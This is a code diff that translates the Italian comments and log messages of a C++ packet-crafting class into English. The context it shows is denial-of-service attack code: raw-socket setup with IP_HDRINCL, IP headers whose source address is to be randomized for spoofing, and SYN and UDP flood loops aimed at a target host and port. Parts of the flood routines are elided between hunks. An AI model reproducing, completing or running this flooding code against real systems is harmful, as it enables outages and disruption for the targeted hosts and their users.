@@ -4,7 +4,7 @@
 #include <fcntl.h>
 #include <errno.h>
 
-// Pseudo header per checksum TCP
+// Pseudo-header for TCP checksum
 struct pseudo_header {
     u_int32_t source_address;
     u_int32_t dest_address;
@@ -22,17 +22,17 @@ PacketCrafter::~PacketCrafter() {
 bool PacketCrafter::initialize() {
     raw_socket = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
     if (raw_socket < 0) {
-        Utils::logError("Impossibile creare raw socket (richiede root)");
+        Utils::logError("Unable to create raw socket (root required)");
         return false;
     }
     
     int one = 1;
     if (setsockopt(raw_socket, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
-        Utils::logError("Impossibile settare IP_HDRINCL");
+        Utils::logError("Unable to set IP_HDRINCL");
         return false;
     }
     
-    Utils::logSuccess("Raw socket inizializzato - Packet crafting pronto");
+    Utils::logSuccess("Raw socket initialized - Packet crafting ready");
     return true;
 }
 
@@ -55,7 +55,7 @@ void PacketCrafter::buildIpHeader(struct iphdr *iph, int dest_ip, int packet_len
     iph->ttl = 255;
     iph->protocol = IPPROTO_TCP;
     iph->check = 0;
-    iph->saddr = inet_addr("10.0.0.1"); // IP fittizio, verrà randomizzato
+    iph->saddr = inet_addr("10.0.0.1"); // Dummy IP, will be randomized
     iph->daddr = dest_ip;
     iph->check = calculateChecksum((unsigned short *)iph, sizeof(struct iphdr) >> 1);
 }
@@ -86,7 +86,7 @@ void PacketCrafter::sendSYNFlood(const std::string &target, int port, int packet
     dest_addr.sin_port = htons(port);
     inet_pton(AF_INET, target.c_str(), &dest_addr.sin_addr);
     
-    Utils::logAttack("Avvio SYN Flood su " + target + ":" + std::to_string(port));
+    Utils::logAttack("Starting SYN Flood against " + target + ":" + std::to_string(port));
     
     for (int i = 0; i < packets && g_running; i++) {
         memset(packet, 0, PACKET_SIZE);
@@ -124,7 +124,7 @@ void PacketCrafter::sendSYNFlood(const std::string &target, int port, int packet
         }
     }
     std::cout << std::endl;
-    Utils::logSuccess("SYN Flood completato");
+    Utils::logSuccess("SYN Flood completed");
 }
 
 void PacketCrafter::sendUDPFlood(const std::string &target, int port, int packets) {
@@ -139,7 +139,7 @@ void PacketCrafter::sendUDPFlood(const std::string &target, int port, int packet
     char payload[1024];
     memset(payload, 'A', sizeof(payload));
     
-    Utils::logAttack("Avvio UDP Flood su " + target + ":" + std::to_string(port));
+    Utils::logAttack("Starting UDP Flood against " + target + ":" + std::to_string(port));
     
     for (int i = 0; i < packets && g_running; i++) {
         sendto(sock, payload, sizeof(payload), 0, (struct sockaddr *)&addr, sizeof(addr));
@@ -150,5 +150,5 @@ void PacketCrafter::sendUDPFlood(const std::string &target, int port, int packet
     }
     close(sock);
     std::cout << std::endl;
-    Utils::logSuccess("UDP Flood completato");
+    Utils::logSuccess("UDP Flood completed");
 }
